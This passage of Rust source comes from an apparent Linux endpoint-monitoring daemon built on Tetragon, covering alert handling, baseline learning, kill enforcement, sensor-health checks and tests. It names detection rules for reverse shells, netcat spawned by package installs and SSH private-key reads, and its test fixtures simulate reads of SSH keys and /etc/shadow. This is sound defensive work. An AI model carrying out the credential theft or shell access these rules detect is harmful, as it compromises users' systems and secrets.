                    cwd: live.map(|p| p.cwd.clone()).unwrap_or_default(),
                }
            })
            .collect();
        ancestry.push(AncestryRow {
            pid: alert.process.pid,
            exe: alert.process.exe.clone(),
            args: alert.process.args.clone(),
            cwd: alert.process.cwd.clone(),
        });

        let dir = self.incidents_dir().join(id);
        let meta: Option<Value> = std::fs::read_to_string(dir.join("meta.json"))
            .ok()
            .and_then(|t| serde_json::from_str(&t).ok());
        let body = bundle::render(&bundle::Input {
            alert: &alert,
            mode: &self.mode,
            ancestry: &ancestry,
            related_alerts: &related_alerts,
            related_receipts: &related_receipts,
            incident: meta.as_ref(),
            incident_dir: meta.as_ref().map(|_| dir.as_path()),
            allowlist_dir: &self.cfg.paths.allowlist_dir.display().to_string(),
            version: crate::VERSION,
        });
        bundle::write(&dir, &body, &self.cfg.group)
            .map_err(|e| format!("{}: {}", dir.display(), e))
    }

    // ------------------------------------------------------ digest, LEARNING §5

    /// The weekly summary. Computed by the daemon, delivered by
    /// `moatctl digest --notify` from the user's session.
    pub fn digest(&self, now: u64) -> digest::Digest {
        let since = now.saturating_sub(7 * 86_400);
        let in_window = |ts: &str| {
            util::rfc3339_to_nanos(ts)
                .map(|n| (n / 1_000_000_000) as u64 >= since)
                .unwrap_or(true)
        };
        let incidents = self
            .store
            .load()
            .iter()
            .filter(|a| !a.is_suppressed() && a.severity_rank() >= 2 && in_window(&a.ts))
            .count() as u64;
        let installs = self
            .store
            .receipts()
            .iter()
            .filter(|r| in_window(&r.started))
            .count() as u64;
        digest::Digest {
            enabled: self.digest_enabled,
            due: digest::next_due(now, &self.cfg.digest.weekday, self.cfg.digest.hour),
            last_sent: self.digest_last_sent,
            summary: digest::Summary {
                incidents,
                installs,
                proposals: self.baseline.proposals().len() as u64,
            },
            weekday: self.cfg.digest.weekday.clone(),
            hour: self.cfg.digest.hour,
        }
    }

    /// `moatctl set digest on|off`.
    pub fn set_digest(&mut self, on: bool) {
        self.digest_enabled = on;
        self.write_state();
        log::info!("weekly digest {}", if on { "on" } else { "off" });
    }

    /// `moatctl digest --notify` reports back that it delivered one, so a
    /// catch-up run after a suspend does not send twice.
    pub fn digest_sent(&mut self, now: u64) {
        self.digest_last_sent = now;
        self.write_state();
    }

    // ---------------------------------------------------- the noise guard §4

    /// One `moat-x-noisy-rule` alert per demotion, naming the top five tuples
    /// and offering both "these are expected" and "keep watching".
    fn raise_noisy_rule(&mut self, d: &Demotion, now: u64) {
        if self.in_meta_alert {
            return;
        }
        let top = self.baseline.top_tuples(&d.rule, 5);
        let meta = crate::rules::noisy_rule_meta(&d.rule, d.count, self.cfg.baseline.noisy_rule_per_day);
        let mut f = Finding::new(crate::rules::NOISY_RULE, meta, self_proc(&d.rule));
        f.hook = "userland".into();
        f.mode = self.mode.clone();
        f.what_override = Some(format!(
            "{} raised {} alerts in the last 24 hours, so Moat moved it to the timeline instead \
             of turning it off.",
            d.rule, d.count
        ));
        f.extra_evidence.push(format!(
            "rolling 24 h count for {}: {} (threshold {})",
            d.rule, d.count, self.cfg.baseline.noisy_rule_per_day
        ));
        if top.is_empty() {
            f.extra_evidence
                .push("no per-tuple history yet for this rule".into());
        }
        for (i, t) in top.iter().enumerate() {
            f.extra_evidence.push(format!(
                "top {}: {} {}{} — {} time{} on {} day{}",
                i + 1,
                t.exe,
                if t.dir.is_empty() { "" } else { "on " },
                if t.dir.is_empty() { "(no file)".to_string() } else { t.dir.clone() },
                t.count,
                if t.count == 1 { "" } else { "s" },
                t.days.len(),
                if t.days.len() == 1 { "" } else { "s" }
            ));
        }
        let block: String = top.iter().map(|t| t.toml()).collect::<Vec<_>>().join("\n");
        f.extra_options = vec![
            ExplainOption {
                scope: "these-are-expected".into(),
                cmd: format!("moatctl baseline propose --rule {}", d.rule),
                line: if block.is_empty() {
                    format!("# no tuples recorded yet for {}", d.rule)
                } else {
                    block
                },
            },
            ExplainOption {
                scope: "keep-watching".into(),
                cmd: format!("moatctl baseline undemote {}", d.rule),
                line: format!(
                    "# clears the demotion; {} goes back to the Alerts tab and the 24 h window \
                     starts over\n",
                    d.rule
                ),
            },
        ];
        self.in_meta_alert = true;
        self.emit(f);
        self.in_meta_alert = false;
        let _ = now;
    }

    // ------------------------------------------- pacman transactions, LEARNING §1

    /// Re-read the pacman database when it moved, and re-check every learned
    /// baseline entry against it: an entry whose actor stopped being official is
    /// disabled in place, with a reason, and a low alert says so.
    pub fn on_pacman_change(&mut self) -> usize {
        if !self.provenance.refresh_if_changed() {
            return 0;
        }
        self.revoke_stale_learned_entries()
    }

    /// The re-check itself. Public so it can be driven directly (and tested)
    /// without waiting for a filesystem mtime to move.
    pub fn revoke_stale_learned_entries(&mut self) -> usize {
        let path = self.cfg.paths.baseline_allowlist();
        let mut revoked = 0;
        for e in self.baseline.learned_entries() {
            let (prov, package) = self.provenance.classify_path(&e.exe);
            if prov.is_official() {
                continue;
            }
            let reason = format!(
                "{}: the actor {} is no longer official (now {}{}), so this learned entry no \
                 longer stands",
                e.rule,
                e.exe,
                prov,
                package.map(|p| format!(", package {}", p)).unwrap_or_default()
            );
            if let Some(t) = self.baseline.state.tuples.get(&e.key).cloned() {
                match crate::allowlist::find_index(&path, &t.spec()) {
                    Some(idx) => {
                        if let Err(err) = crate::allowlist::disable_rule(&path, idx, &reason) {
                            log::warn!("{}: {}", path.display(), err);
                        }
                    }
                    None => log::debug!("baseline: no block in {} for {}", path.display(), e.key),
                }
            }
            self.baseline.mark_revoked(&e.key, &reason);
            revoked += 1;

            let meta = crate::rules::baseline_revoked_meta(&e.rule);
            let mut f = Finding::new(crate::rules::BASELINE_REVOKED, meta, self_proc(&e.rule));
            f.mode = self.mode.clone();
            f.what_override = Some(format!(
                "A learned baseline entry for {} was disabled: {} is no longer shipped by a \
                 trusted repository.",
                e.rule, e.exe
            ));
            f.extra_evidence = vec![reason.clone(), format!("entry written {}", e.written)];
            self.in_meta_alert = true;
            self.emit(f);
            self.in_meta_alert = false;
        }
        if revoked > 0 {
            self.reload_allowlist();
        }
        revoked
    }

    /// Periodic upkeep: demotions that have gone quiet, and the two files.
    pub fn baseline_tick(&mut self, now: u64, force_save: bool) {
        for rule in self.baseline.clear_stale_demotions(now) {
            log::info!("noise guard: {} is quiet again; the demotion is cleared", rule);
        }
        // An install whose exit line we never saw (restart, rotation, a dropped
        // event) would otherwise sit in the tracker for ever.
        let dropped = self.receipts.prune(now, 6 * 3_600);
        if dropped > 0 {
            log::debug!("receipts: dropped {} install(s) with no exit", dropped);
        }
        self.rarity.save_if_due(now, force_save);
        self.baseline.save_if_due(now, force_save);
    }

    /// A userland rule that enforces in the daemon (currently only
    /// `moat-pkg-subtree-netcat-exec`) kills **only** in enforce mode, and only
    /// after `/proc/<pid>` proves the pid is still the process the finding
    /// names — the same start-time check the `kill` socket command uses, so a
    /// recycled pid is never signalled.
    ///
    /// Returns whether the process was actually killed; the outcome is recorded
    /// as evidence either way, because "we tried and it was already gone" and
    /// "we killed it" are different facts.
    fn maybe_enforce(&self, f: &mut Finding) -> bool {
        if !f.request_kill {
            return false;
        }
        if self.mode != "enforce" {
            // Belt and braces: the rule already checks the mode.
            return false;
        }
        let pid = f.proc.pid;
        let start = util::normalize_ts(&f.proc.start_time);
        if pid <= 1 {
            f.extra_evidence
                .push("enforce mode: no usable pid to signal".into());
            return false;
        }
        if let Err(e) = crate::control::verify_pid(pid, &start, &f.proc.exe) {
            log::warn!("{}: not killing pid {}: {}", f.rule, pid, e);
            f.extra_evidence.push(format!(
                "enforce mode: pid {} was NOT killed — {}",
                pid, e
            ));
            return false;
        }
        let rc = unsafe { libc::kill(pid as libc::pid_t, libc::SIGKILL) };
        if rc == 0 {
            log::info!("{}: SIGKILL sent to pid {} (enforce mode)", f.rule, pid);
            f.extra_evidence.push(format!(
                "enforce mode: moatd sent SIGKILL to pid {} after verifying its start time",
                pid
            ));
            true
        } else {
            let e = std::io::Error::last_os_error();
            log::warn!("{}: kill({}) failed: {}", f.rule, pid, e);
            f.extra_evidence.push(format!(
                "enforce mode: pid {} was NOT killed — kill() failed: {}",
                pid, e
            ));
            false
        }
    }

    /// NOTES §7: `action: KPROBE_ACTION_SIGKILL` is reported in monitor mode
    /// too. Only a `process_exit` carrying `signal: SIGKILL` proves the kill.
    fn confirm_kill(&mut self, exec_id: &str, signal: Option<&str>) {
        let Some(alert_id) = self.pending_kill.remove(exec_id) else {
            return;
        };
        if signal != Some("SIGKILL") {
            log::debug!(
                "alert {}: policy asked for a kill but exit signal was {:?}; action_taken stays none",
                alert_id,
                signal
            );
            return;
        }
        let u = UpdateLine::new(&alert_id).set("action_taken", Value::from("killed"));
        if let Err(e) = self.store.append_update(&u) {
            log::error!("alerts.jsonl: {}", e);
        } else {
            log::info!("alert {}: kill confirmed by process_exit SIGKILL", alert_id);
        }
    }

    pub fn mark(&mut self, id: &str, key: &str, value: Value) -> Result<(), String> {
        self.store
            .append_update(&UpdateLine::new(id).set(key, value))
            .map_err(|e| e.to_string())
    }

    pub fn find_alert(&self, id: &str) -> Option<Alert> {
        self.store.find(id)
    }

    // ----------------------------------------------------------------- status

    /// TracingPolicies the kernel is actually running, counted from the
    /// directories Tetragon pins under its bpffs dir (one per loaded policy).
    ///
    /// `None` means the directory could not be read at all — not mounted, or
    /// this process is not root — which is different from "zero loaded" and
    /// must not be reported as an outage.
    pub fn sensors_loaded(&self) -> Option<usize> {
        let entries = std::fs::read_dir(&self.cfg.paths.tetragon_bpf_dir).ok()?;
        Some(
            entries
                .filter_map(|e| e.ok())
                .filter(|e| e.file_name().to_string_lossy().starts_with("moat-"))
                .count(),
        )
    }

    /// Is the sensor doing its job, in the only terms that matter: how many of
    /// our policies are loaded in the kernel right now.
    ///
    /// The two obvious signals both lie. The gRPC socket is a file that
    /// outlives the process that made it, and the export log keeps getting
    /// fresh writes during a crash loop because every Tetragon start re-walks
    /// `/proc` and re-emits an exec event per live process. On 2026-09-03 this
    /// function returned "running" for 25 minutes while Tetragon was exiting
    /// 255 every 13 seconds and **zero** policies were loaded — the machine was
    /// completely unprotected and every surface said it was fine. Counting
    /// pinned policies is the fix: it asks the kernel, and it goes to zero the
    /// instant the sensor dies.
    pub fn tetragon_state(&self) -> String {
        let expected = self.policies.len();
        match self.sensors_loaded() {
            Some(0) if expected > 0 => "down".into(),
            Some(n) if n < expected => format!("degraded {}/{}", n, expected),
            Some(_) => "running".into(),
            // Cannot see bpffs. Fall back to the old, weaker heuristics, but
            // never claim more than "unverified" from them.
            None => {
                if self.cfg.paths.tetragon_socket.exists() {
                    return "unverified".into();
                }
                if let Ok(m) = std::fs::metadata(&self.cfg.paths.tetragon_log) {
                    use std::os::unix::fs::MetadataExt;
                    let age = util::unix_secs().saturating_sub(m.mtime().max(0) as u64);
                    if age < 300 {
                        return "unverified".into();
                    }
                    return "stale".into();
                }
                "stopped".into()
            }
        }
    }

    /// True when the sensor is not fully loaded. The shield must not be green
    /// here no matter how quiet the alert counts are: no alerts from a dead
    /// sensor is the most dangerous shape of "quiet" there is.
    pub fn sensor_unhealthy(&self) -> bool {
        !matches!(self.tetragon_state().as_str(), "running" | "unverified")
    }

    pub fn sandbox_on(&self) -> bool {
        self.cfg.paths.sandbox_flag.exists()
    }

    pub fn status(&self) -> Value {
        let unacked = self.store.unacked();
        let now = util::unix_secs();
        let mut digest_summary = self.digest(now).to_json();
        if let Some(o) = digest_summary.as_object_mut() {
            o.insert("last_sent_unix".into(), Value::from(self.digest_last_sent));
        }
        json!({
            "ok": true,
            "version": crate::VERSION,
            "mode": self.mode,
            "tetragon": self.tetragon_state(),
            // `policies` is what is on disk; `sensors_loaded` is what the
            // kernel is running. They are equal on a healthy machine and the
            // gap between them is the whole point of reporting both.
            "policies": self.policies.len(),
            "sensors_loaded": self.sensors_loaded(),
            "sensor_unhealthy": self.sensor_unhealthy(),
            "policies_failed": self.policies_failed,
            "feeds": {
                "updated": self.feeds.meta.updated,
                "hashes": self.feeds.meta.hashes,
                "domains": self.feeds.meta.domains,
                "urls": self.feeds.meta.urls,
            },
            "unacked": unacked,
            "sandbox": self.sandbox_on(),
            // Whether the *caller* is in the group is a client-side question:
            // if it were not, it could not have reached this socket.
            "socket_group": self.cfg.group,
            "uptime_secs": now.saturating_sub(self.started),
            "events_seen": self.events_seen,
            "alerts": self.alerts_emitted,
            "alerts_suppressed": self.alerts_suppressed,
            "processes": self.table.len(),
            "allowlist_rules": self.allowlist.len(),

            // --- BASELINE §8 "Resolved shapes" ---------------------------
            "installed_at": util::rfc3339_of(self.baseline.state.installed_at),
            "baseline": self.baseline.status(now),
            "proposals": self.baseline.proposals(),
            "demoted_rules": self.baseline.demoted_rules(),
            "rarity_counters": self.rarity.len(),

            // --- LEARNING §9 "Resolved shapes" ----------------------------
            // `digest` is the boolean the plugin's settings row binds to;
            // `digest_summary` is the {due, text} block LEARNING §5 asks the
            // daemon to publish, which `moatctl digest` prints and the user
            // timer delivers.
            "digest": self.digest_enabled,
            "digest_enabled": self.digest_enabled,
            "digest_summary": digest_summary,
            "incidents": incident::count(&self.incidents_dir()),
            "incidents_dir": self.incidents_dir().display().to_string(),
            "incidents_captured": self.incidents_captured,
            "receipts": self.store.receipts().len(),
            "installs_watched": self.receipts.len(),

            "provenance": {
                "packages": self.provenance.db().packages,
                "files": self.provenance.db().files,
                "trusted_repos": self.cfg.baseline.trusted_repos,
            },
        })
    }

    pub fn write_state(&self) {
        let path = self.cfg.paths.state_file();
        let body = format!(
            "{}\n",
            serde_json::to_string_pretty(&self.status()).unwrap_or_default()
        );
        if let Err(e) = util::atomic_write(&path, body.as_bytes(), 0o640) {
            log::warn!("state.json: {}", e);
            return;
        }
        let _ = util::secure_path(&path, &self.cfg.group, 0o640);
    }
}

/// `Finding` built straight from a policy name needs its family from the name.
impl Finding {
    fn family_fixup(&mut self) {
        if self.meta.family.is_empty() || self.meta.family == "other" {
            self.meta.family = family_of(&self.rule);
        }
    }
}

fn access_word(mask: Option<i64>) -> Option<String> {
    let m = mask?;
    let mut parts = Vec::new();
    if m & 4 != 0 {
        parts.push("read");
    }
    if m & 2 != 0 {
        parts.push("write");
    }
    if m & 1 != 0 {
        parts.push("exec");
    }
    if m & 8 != 0 {
        parts.push("append");
    }
    if parts.is_empty() {
        Some(format!("mask {}", m))
    } else {
        Some(parts.join("+"))
    }
}

fn read_state(path: &Path) -> Option<Value> {
    let text = std::fs::read_to_string(path).ok()?;
    serde_json::from_str(&text).ok()
}

fn persisted_mode(state: &Option<Value>) -> Option<String> {
    let m = state.as_ref()?.get("mode")?.as_str()?;
    (m == "monitor" || m == "enforce").then(|| m.to_string())
}

/// BASELINE §3 puts `installed_at` in `state.json`; it is stamped there on the
/// first run and never moved again, so a wiped `baseline.json` does not restart
/// the learning window on a machine that has been running for months.
fn persisted_installed_at(state: &Option<Value>) -> Option<u64> {
    let v = state.as_ref()?.get("installed_at")?;
    if let Some(n) = v.as_u64() {
        return (n > 0).then_some(n);
    }
    let nanos = util::rfc3339_to_nanos(v.as_str()?)?;
    let secs = (nanos / 1_000_000_000) as u64;
    (secs > 0).then_some(secs)
}

/// LEARNING §5: the digest switch lives in state.json, so turning it off needs
/// no root and no `systemctl`. `digest_enabled` is the name the doc gives it;
/// `digest` is the boolean `status` publishes. Either is accepted.
fn persisted_digest_enabled(state: &Option<Value>) -> Option<bool> {
    let s = state.as_ref()?;
    s.get("digest_enabled")
        .or_else(|| s.get("digest"))
        .and_then(|v| v.as_bool())
}

fn persisted_u64(state: &Option<Value>, section: &str, key: &str) -> u64 {
    state
        .as_ref()
        .and_then(|s| s.get(section))
        .and_then(|s| s.get(key))
        .and_then(|v| v.as_u64())
        .unwrap_or(0)
}

/// A synthetic process for the alerts moat raises about itself. The pid is our
/// own so `ps -fp` shows something real, and there is nothing to kill.
fn self_proc(about: &str) -> ProcInfo {
    ProcInfo {
        exec_id: String::new(),
        pid: std::process::id(),
        uid: unsafe { libc::geteuid() },
        exe: std::env::current_exe()
            .map(|p| p.display().to_string())
            .unwrap_or_else(|_| "/usr/bin/moatd".into()),
        args: about.to_string(),
        cwd: String::new(),
        start_time: util::now_rfc3339(),
        parent_exec_id: None,
        exited_at: None,
        exit_signal: None,
        exe_note: None,
    }
}

/// Append one learned block to `baseline.toml`, creating it with a header that
/// says who writes it and how to undo it.
fn write_learned(path: &Path, comment: &str, toml: &str) -> std::io::Result<()> {
    use std::io::Write;
    if let Some(p) = path.parent() {
        std::fs::create_dir_all(p)?;
    }
    let mut block = String::new();
    if !path.exists() {
        block.push_str(
            "# Written by moatd's learning window (BASELINE §3). Every entry says how it was\n\
             # earned. Remove one with `moatctl allowlist` then `moatctl unignore --file\n\
             # baseline.toml <index>`, or restart learning with `moatctl baseline relearn`.\n",
        );
    }
    block.push('\n');
    block.push_str(&format!("# {}\n", comment));
    block.push_str(toml);
    let mut f = std::fs::OpenOptions::new().create(true).append(true).open(path)?;
    f.write_all(block.as_bytes())?;
    f.sync_all()
}

// ------------------------------------------------------------------- run loop

pub struct RunOptions {
    /// Replay the log from offset 0 instead of tailing from the end.
    pub from_start: bool,
    /// Stop once the log has no more lines (used by dev-run and tests).
    pub once: bool,
    pub poll: Duration,
}

impl Default for RunOptions {
    fn default() -> Self {
        Self {
            from_start: false,
            once: false,
            poll: Duration::from_millis(200),
        }
    }
}

pub fn run(daemon: Arc<Mutex<Daemon>>, opts: RunOptions) {
    let (log_path, state_every, feeds_every, feeds_dir) = {
        let d = daemon.lock().expect("daemon lock");
        (
            d.cfg.paths.tetragon_log.clone(),
            d.cfg.thresholds.state_interval_secs,
            d.cfg.thresholds.feeds_poll_secs,
            d.cfg.paths.feeds(),
        )
    };
    let mut tailer = Tailer::new(&log_path, opts.from_start);
    let mut last_state = 0u64;
    let mut last_feeds = util::unix_secs();
    let mut idle_polls = 0u32;

    log::info!("tailing {}", log_path.display());
    loop {
        if SHUTDOWN.load(Ordering::SeqCst) {
            log::info!("shutting down");
            let mut d = daemon.lock().expect("daemon lock");
            // rarity.json and baseline.json are flushed on the way out; the
            // 60 s timer must not cost a day of counters on a restart.
            d.baseline_tick(util::unix_secs(), true);
            d.write_state();
            break;
        }
        if RELOAD.swap(false, Ordering::SeqCst) {
            log::info!("SIGHUP: reloading policies and allowlist");
            daemon.lock().expect("daemon lock").reload();
        }

        let lines = tailer.poll();
        let got = !lines.is_empty();
        if got {
            let mut d = daemon.lock().expect("daemon lock");
            for l in lines {
                d.handle_line(&l);
            }
        }

        let now = util::unix_secs();
        if now.saturating_sub(last_state) >= state_every {
            last_state = now;
            let mut d = daemon.lock().expect("daemon lock");
            d.table.prune(now);
            // One stat of /var/lib/pacman/local; a reload only happens when a
            // transaction actually moved it (BASELINE §1).
            d.on_pacman_change();
            d.baseline_tick(now, false);
            d.write_state();
        }
        if now.saturating_sub(last_feeds) >= feeds_every {
            last_feeds = now;
            let mut d = daemon.lock().expect("daemon lock");
            if d.feeds.reload_if_changed(&feeds_dir) {
                log::info!("feeds reloaded: {} hashes", d.feeds.meta.hashes);
            }
        }

        if got {
            idle_polls = 0;
        } else {
            idle_polls += 1;
            if opts.once && idle_polls > 2 {
                let mut d = daemon.lock().expect("daemon lock");
                let now = util::unix_secs();
                d.table.prune(now);
                d.baseline_tick(now, true);
                d.write_state();
                break;
            }
            std::thread::sleep(opts.poll);
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn dev_daemon(dir: &Path) -> (Daemon, Config) {
        let mut cfg = Config::default();
        cfg.paths.state_dir = dir.join("state");
        cfg.paths.runtime_dir = dir.join("run");
        cfg.paths.socket = dir.join("run/control.sock");
        cfg.paths.policies_dir =
            Path::new(env!("CARGO_MANIFEST_DIR")).join("testdata/policies");
        cfg.paths.allowlist_dir = dir.join("allowlist.d");
        cfg.paths.tetragon_log = Path::new(env!("CARGO_MANIFEST_DIR")).join("testdata/sample.log");
        cfg.paths.sandbox_flag = dir.join("sandbox.enabled");
        // Snapshots and bundles must never touch the real /var/lib/moat.
        cfg.analysis.bundle_dir = dir.join("incidents");
        // Provenance runs off a fixture, so no test touches the real pacman
        // database and none of them spawn the real pacman.
        cfg.paths.pacman_local = Path::new(env!("CARGO_MANIFEST_DIR")).join("testdata/pacman-local");
        cfg.paths.pacman = Path::new(env!("CARGO_MANIFEST_DIR")).join("testdata/fake-pacman");
        std::fs::create_dir_all(&cfg.paths.allowlist_dir).unwrap();
        let mut d = Daemon::new(cfg.clone(), &dir.join("moat.toml")).unwrap();
        d.homes = vec!["/home/dan".into()];
        d.provenance.set_homes(&d.homes);
        (d, cfg)
    }

    /// Alert ids are the timeline, so a burst inside one millisecond must still
    /// come back in the order it was emitted. `Ulid::new()` only orders by the
    /// embedded millisecond and tied on the random suffix, which made
    /// `store.load().next_back()` — and `moatctl list`'s "newest last" — a coin
    /// flip for same-millisecond alerts.
    #[test]
    fn alert_ids_are_monotonic_inside_one_millisecond() {
        let dir = tempfile::tempdir().unwrap();
        let (mut d, _) = dev_daemon(dir.path());
        let ids: Vec<String> = (0..500).map(|_| d.next_id()).collect();
        // Fast enough that the millisecond prefix repeats; if it never did the
        // test would pass for the wrong reason.
        let prefixes: std::collections::HashSet<&str> =
            ids.iter().map(|i| &i[..10]).collect();
        assert!(
            prefixes.len() < ids.len(),
            "no two ids shared a millisecond, so this proves nothing"
        );
        let mut sorted = ids.clone();
        sorted.sort();
        assert_eq!(ids, sorted, "ids must sort into the order they were issued");
    }

    /// The regression for the 2026-09-03 outage: Tetragon crash-looped for 25
    /// minutes while `status` said "running" and the shield stayed green,
    /// because both signals were a file's existence and a log's mtime — and a
    /// crash loop keeps both fresh. Health has to be counted from the kernel.
    #[test]
    fn sensor_health_is_counted_from_the_kernel_not_guessed() {
        let dir = tempfile::tempdir().unwrap();
        let (mut d, _) = dev_daemon(dir.path());
        let expected = d.policies.len();
        assert!(expected > 0, "fixture must ship policies");

        let pins = dir.path().join("bpf");
        std::fs::create_dir_all(&pins).unwrap();
        d.cfg.paths.tetragon_bpf_dir = pins.clone();

        // Nothing pinned: the sensor is down, however healthy systemd looks.
        assert_eq!(d.sensors_loaded(), Some(0));
        assert_eq!(d.tetragon_state(), "down");
        assert!(d.sensor_unhealthy());

        // Every policy pinned: running.
        for name in d.policies.names() {
            std::fs::create_dir_all(pins.join(&name)).unwrap();
        }
        // Tetragon's own sensors sit here too and must not be counted as ours.
        std::fs::create_dir_all(pins.join("__base__")).unwrap();
        assert_eq!(d.sensors_loaded(), Some(expected));
        assert_eq!(d.tetragon_state(), "running");
        assert!(!d.sensor_unhealthy());

        // One policy fails to attach — the exact E2BIG shape — and the count
        // names how many of how many, rather than rounding up to "running".
        std::fs::remove_dir_all(pins.join(d.policies.names()[0].clone())).unwrap();
        assert_eq!(
            d.tetragon_state(),
            format!("degraded {}/{}", expected - 1, expected)
        );
        assert!(d.sensor_unhealthy());

        // bpffs unreadable is not the same claim as "zero loaded". With the
        // socket there we genuinely cannot tell, so say "unverified" and do not
        // cry wolf; with nothing there at all the old signals still convict.
        d.cfg.paths.tetragon_bpf_dir = dir.path().join("does-not-exist");
        assert_eq!(d.sensors_loaded(), None);

        d.cfg.paths.tetragon_socket = dir.path().join("tetragon.sock");
        std::fs::write(&d.cfg.paths.tetragon_socket, b"").unwrap();
        assert_eq!(d.tetragon_state(), "unverified");
        assert!(!d.sensor_unhealthy(), "unverified is not evidence of an outage");

        std::fs::remove_file(&d.cfg.paths.tetragon_socket).unwrap();
        d.cfg.paths.tetragon_log = dir.path().join("no-such.log");
        assert_eq!(d.tetragon_state(), "stopped");
        assert!(d.sensor_unhealthy());
    }

    /// The daemon must not alert on its own reads. An incident snapshot reads
    /// /proc/<pid>/{environ,status,cmdline,fd} for the alerting process and
    /// every ancestor, so any file rule covering those paths turns one alert
    /// into an unbounded chain of them.
    #[test]
    fn moatd_never_alerts_on_its_own_reads() {
        let dir = tempfile::tempdir().unwrap();
        let (mut d, _) = dev_daemon(dir.path());
        let me = std::process::id();

        let line = |pid: u32| {
            format!(
                r#"{{"process_kprobe":{{"process":{{"exec_id":"e-{pid}","pid":{pid},"uid":0,"binary":"/usr/bin/moatd","arguments":"run","cwd":"/","start_time":"2026-09-03T16:21:00.000000000Z"}},"function_name":"security_file_post_open","policy_name":"moat-cred-ssh-private-key-read","args":[{{"file_arg":{{"path":"/home/dan/.ssh/id_ed25519"}}}},{{"int_arg":4}}]}},"time":"2026-09-03T16:21:00.100Z"}}"#
            )
        };

        // Somebody else doing it is exactly what the rule is for.
        let other = if me == 4242 { 4243 } else { 4242 };
        let n = d.store.load().len();
        d.handle_line(&line(other));
        assert!(d.store.load().len() > n, "another process still alerts");

        // Us doing it is the loop, and must produce nothing at all.
        let n = d.store.load().len();
        d.handle_line(&line(me));
        assert_eq!(d.store.load().len(), n, "moatd must not alert on itself");
    }

    fn replay(d: &mut Daemon) {
        let text = std::fs::read_to_string(&d.cfg.paths.tetragon_log).unwrap();
        for line in text.lines() {
            d.handle_line(line);
        }
    }

    #[test]
    fn the_sample_log_produces_explainable_alerts() {
        let dir = tempfile::tempdir().unwrap();
        let (mut d, _) = dev_daemon(dir.path());
        d.homes = vec!["/home/dan".into()];
        replay(&mut d);

        let alerts = d.store.load();
        let rules: Vec<&str> = alerts.iter().map(|a| a.rule.as_str()).collect();
        assert!(rules.contains(&"moat-cred-ssh-private-key-read"));
        assert!(rules.contains(&"moat-net-reverse-shell"));
        assert!(rules.contains(&"moat-x-ai-cli-headless"));

        for a in &alerts {
            assert!(!a.explain.what.is_empty(), "{} has no what", a.rule);
            assert!(!a.explain.why.is_empty(), "{} has no why", a.rule);
            assert!(a.explain.evidence.len() >= 3, "{} has thin evidence", a.rule);
            assert!(!a.explain.next.is_empty());
            assert!(!a.explain.if_expected.options.is_empty());
            assert_eq!(a.v, 1);
            assert!(!a.id.is_empty());
        }
    }

    #[test]
    fn ancestry_reaches_the_package_manager() {
        let dir = tempfile::tempdir().unwrap();
        let (mut d, _) = dev_daemon(dir.path());
        replay(&mut d);
        let a = d
            .store
            .load()
            .into_iter()
            .find(|a| a.rule == "moat-cred-ssh-private-key-read")
            .unwrap();
        let exes: Vec<String> = a.process.ancestry.iter().map(|x| x.exe.clone()).collect();
        assert!(exes.iter().any(|e| e.ends_with("/npm")), "{:?}", exes);
        assert!(a.summary.contains("Parent chain: fish -> npm -> sh -> node"));
    }

    #[test]
    fn a_kill_is_only_recorded_after_the_exit_signal() {
        let dir = tempfile::tempdir().unwrap();
        let (mut d, _) = dev_daemon(dir.path());
        replay(&mut d);
        let a = d
            .store
            .load()
            .into_iter()
            .find(|a| a.rule == "moat-net-reverse-shell")
            .unwrap();
        // The event carried KPROBE_ACTION_SIGKILL and the sample log has the
        // matching SIGKILL exit, so this one is confirmed.
        assert_eq!(a.action_taken, "killed");
        assert!(a
            .explain
            .evidence
            .iter()
            .any(|e| e.contains("only recorded once process_exit reports SIGKILL")));

        // Without the exit line it must stay "none".
        let dir2 = tempfile::tempdir().unwrap();
        let (mut d2, _) = dev_daemon(dir2.path());
        let text = std::fs::read_to_string(&d2.cfg.paths.tetragon_log).unwrap();
        for line in text.lines().filter(|l| !l.contains("process_exit")) {
            d2.handle_line(line);
        }
        let a2 = d2
            .store
            .load()
            .into_iter()
            .find(|a| a.rule == "moat-net-reverse-shell")
            .unwrap();
        assert_eq!(a2.action_taken, "none");
    }

    /// BASELINE §8: a suppressed alert is recorded, greyed out and uncounted —
    /// it is not dropped. A suppression the user cannot see is exactly the kind
    /// of silence this project promises not to produce.
    #[test]
    fn the_allowlist_records_a_suppressed_alert_instead_of_dropping_it() {
        let dir = tempfile::tempdir().unwrap();
        let (mut d, cfg) = dev_daemon(dir.path());
        std::fs::write(
            cfg.paths.allowlist_dir.join("user.toml"),
            "# expected: our own node\n[[rule]]\nname = \"moat-cred-ssh-private-key-read\"\nexe = \"*/bin/node\"\n",
        )
        .unwrap();
        d.reload_allowlist();
        replay(&mut d);

        let a = d
            .store
            .load()
            .into_iter()
            .find(|a| a.rule == "moat-cred-ssh-private-key-read")
            .expect("still on the timeline");
        assert_eq!(a.suppressed_by.as_deref(), Some("user.toml#1"));
        assert!(a
            .explain
            .evidence
            .iter()
            .any(|e| e.contains("suppressed by allowlist entry user.toml#1")));
        // Out of the badge, and counted separately from real alerts.
        let counted = d
            .store
            .load()
            .iter()
            .filter(|x| !x.acked && !x.is_suppressed() && x.severity == a.severity)
            .count() as u64;
        assert_eq!(d.store.unacked()[&a.severity], counted, "suppressed alerts are not counted");
        assert!(d.alerts_suppressed >= 1);
    }

    #[test]
    fn repeats_inside_the_window_fold_into_a_count() {
        let dir = tempfile::tempdir().unwrap();
        let (mut d, _) = dev_daemon(dir.path());
        let line = std::fs::read_to_string(&d.cfg.paths.tetragon_log)
            .unwrap()
            .lines()
            .find(|l| l.contains("moat-cred-ssh-private-key-read"))
            .unwrap()
            .to_string();
        for _ in 0..5 {
            d.handle_line(&line);
        }
        let alerts: Vec<Alert> = d
            .store
            .load()
            .into_iter()
            .filter(|a| a.rule == "moat-cred-ssh-private-key-read")
            .collect();
        assert_eq!(alerts.len(), 1, "one alert, not five");
        assert_eq!(alerts[0].count, Some(5));
    }

    #[test]
    fn a_non_moat_policy_is_enrichment_only() {
        let dir = tempfile::tempdir().unwrap();
        let (mut d, _) = dev_daemon(dir.path());
        let line = r#"{"process_kprobe":{"process":{"exec_id":"zz","pid":1,"uid":0,"binary":"/usr/bin/x"},"function_name":"security_file_permission","policy_name":"some-other-policy","args":[{"file_arg":{"path":"/etc/shadow"}}]},"time":"2026-09-03T16:00:00Z"}"#;
        d.handle_line(line);
        assert!(d.store.load().is_empty());
        assert!(d.table.get("zz").is_some(), "still used for enrichment");
    }

    /// The event that started the re-validation work: the SSH-key policy's name
